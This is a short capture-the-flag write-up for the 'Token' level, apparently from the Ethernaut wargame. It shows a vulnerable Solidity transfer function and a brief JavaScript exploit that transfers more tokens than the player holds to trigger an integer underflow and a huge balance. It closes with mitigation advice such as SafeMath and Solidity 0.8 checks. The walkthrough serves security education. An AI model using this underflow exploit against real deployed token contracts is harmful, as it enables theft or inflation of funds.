# Level 5: Token

## Challenge Overview

The `Token` challenge demonstrates integer underflows in Solidity.  
The goal is to exploit an underflow vulnerability to increase your token balance.

## Goal

- Exploit the `transfer` function to gain a large balance of tokens.

## Solution

The vulnerable `transfer` function looks like this:

```solidity
balances[msg.sender] -= _value;
balances[_to] += _value;
```

To exploit this:

### 1. Transfer more tokens than your current balance

```javascript
// pick any “victim” address (even an empty one)
const victim = "0x0000000000000000000000000000000000000001";

// transfer more than your balance (20 → underflow)
await contract.transfer(victim, 21);
```

The subtraction underflows, giving you a huge balance.

### 2. Verify your balance

```javascript
const balance = await contract.balanceOf(player);
console.log(balance.toString());
```

---

## Lessons Learned

- Always use safe math libraries like OpenZeppelin’s SafeMath.
- Solidity 0.8.0 and later automatically revert on overflow/underflow.
